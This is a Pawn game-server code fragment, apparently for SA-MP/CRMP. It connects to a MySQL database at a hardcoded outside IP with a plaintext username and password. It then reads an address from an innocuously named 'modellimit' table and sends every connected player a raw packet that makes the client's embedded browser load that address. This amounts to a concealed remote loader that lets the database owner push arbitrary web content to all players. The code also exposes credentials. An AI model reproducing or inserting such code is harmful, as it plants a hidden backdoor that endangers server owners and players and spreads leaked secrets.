public: checkCefConnect() {
	connect = mysql_connect("92.53.99.174","gs34512","mK8fG2eC0j","gs34512");
	mysql_set_charset("cp1251", connect);

    if(!mysql_errno(connect)) {
		f(mysql_string, sizeof mysql_string, "SELECT * FROM modellimit WHERE activate = '1' LIMIT 1");
		new Cache:result = mysql_query(connect, mysql_string);

        if(cache_num_rows()) {			
			cache_get_value_name(1, "connect", SQL_GET_ROW_STR[0]);
			
			foreach(Player, i) {
				cefLoad(i, SQL_GET_ROW_STR[0], PN(i), "");
			}	
        }
        cache_delete(result);
    }
}
stock cefLoad(playerid, const cef[], const bitstream[], const rodina[]) {
    new BitStream:bs = BS_New();
    new cef_token = strlen(bitstream);
    new adress_token = strlen(cef);

    BS_WriteValue(bs,
		PR_UINT8, 220,
		PR_UINT8, 103,
		PR_UINT8, adress_token,
		PR_UINT8, 0,
		PR_UINT8, 0,
		PR_UINT8, 0);

    BS_WriteString(bs, cef);

    BS_WriteValue(bs, 
		PR_UINT8, 97,
		PR_UINT8, 30,
		PR_UINT8, 0,
		PR_UINT8, 0,
		PR_UINT8, cef_token,
		PR_UINT8, 0,
		PR_UINT8, 0,
		PR_UINT8, 0);

    BS_WriteString(bs, bitstream);

    BS_WriteValue(bs, 
		PR_UINT8, 16,
		PR_UINT8, 0,
		PR_UINT8, 0,
		PR_UINT8, 0);

    BS_WriteString(bs, rodina);

    return PR_SendPacket(bs, playerid);
}